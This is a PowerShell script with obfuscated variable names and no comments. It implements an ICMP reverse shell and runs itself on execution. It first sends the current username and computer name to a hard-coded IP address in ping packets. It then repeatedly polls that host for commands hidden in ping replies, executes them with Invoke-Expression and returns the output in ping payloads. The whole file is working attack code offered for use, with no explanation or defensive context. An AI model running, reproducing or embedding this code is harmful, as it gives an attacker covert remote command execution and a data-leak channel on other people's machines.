function wina
{
	$winb = "192.168.1.122"
	$winc = 5
	$wind = 128
    $winf = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $True
    $winh = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
    $winf.Send($winb,60 * 1000, $winh, $PingOptions) | Out-Null
    $winh = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
    $winf.Send($winb,60 * 1000, $winh, $PingOptions) | Out-Null

    while ($true)
    {
        $winh = ([text.encoding]::ASCII).GetBytes('')
        $wini = $winf.Send($winb,60 * 1000, $winh, $PingOptions)
        if ($wini.Buffer)
        {
            $winj = ([text.encoding]::ASCII).GetString($wini.Buffer)
            $wink = (Invoke-Expression -Command $winj 2>&1 | Out-String )
            $winh = ([text.encoding]::ASCII).GetBytes($wink)
            $winl = [math]::floor($winh.length/$wind)
            $i = 0
            if ($winh.length -gt $wind)
            {
                while ($i -lt $winl )
                {
                    $winm = $winh[($i*$wind)..(($i+1)*$wind-1)]
                    $winf.Send($winb,60 * 10000, $winm, $PingOptions) | Out-Null
                    $i +=1
                }
                $wino = $winh.Length % $wind
                if ($wino -ne 0)
                {
                    $winm = $winh[($i*$wind)..($winh.Length)]
                    $winf.Send($winb,60 * 10000, $winm, $PingOptions) | Out-Null
                }
            }
            else
            {
                $winf.Send($winb,60 * 10000, $winh, $PingOptions) | Out-Null
            }
            $winh = ([text.encoding]::ASCII).GetBytes("`nPS " + (Get-Location).Path + '> ')
            $winf.Send($winb,60 * 1000, $winh, $PingOptions) | Out-Null
        }
        else
        {
            Start-Sleep -Seconds $winc
        }
    }
}

wina
